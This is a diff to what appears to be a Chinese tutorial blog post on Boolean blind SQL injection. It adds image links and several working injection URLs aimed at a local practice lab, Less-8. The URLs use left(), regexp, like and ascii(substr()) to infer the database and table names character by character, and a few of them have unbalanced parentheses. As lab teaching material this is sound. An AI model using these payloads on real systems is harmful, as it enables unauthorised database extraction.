@@ -36,7 +36,7 @@ tags: web安全 sql注入 布尔盲注
 错误请求，id=1' -> 返回 与正确页面不同的页面  
 1.如果页面返回“假”，说明系统执行的SQL语句为“假”如：id=1 and left((select version()),1)=5--+  
 2.想办法构造语句，判断数据库中内容的值  
-【图片】
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/01.jpeg)
 
 ### 02布尔盲注方法
 
@@ -52,6 +52,9 @@ tags: web安全 sql注入 布尔盲注
 	ascii() substr(a,b,c)从b位置开始，截取字符串a到c长度，ascii()将某个字符转换为ascii值
 	ord()	ord(mid((select user()),1,1))=114
 	mid()	mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数痛ascii(),将字符串转为ascii值
+	
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/02.jpeg)
+
 
 [MySql正则表达式](http://www.runoob.com/mysql/mysql-regexp.html)
 
@@ -62,6 +65,34 @@ tags: web安全 sql注入 布尔盲注
 	http://localhost:90/Less-8/?id=1' and left((select database()),1)='s'--+ 显示正确第一位为s
 
 	http://localhost:90/Less-8/?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e'--+ 第一个表名称字符
+
+	http://localhost:90/Less-8/?id=1' and (select database() regexp '^s')--+
+
+	http://localhost:90/Less-8/?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp '^s')--+
+
+	http://localhost:90/Less-8/?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like 'e%')--+
+
+	http://localhost:90/Less-8/?id=1 and ascii((substr((select database()),1,1))=115--+
+
+	http://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from information_schema.tables where table_schema=database()),1,1))=115--+
+
+
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/ascii.jpg)
+
+
+## burp操作步骤
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/03.png)
+
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/04.jpg)
+
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/05.png)
+
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/06.png)
+
+![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/07.jpg)
+
+
+
 
 
 
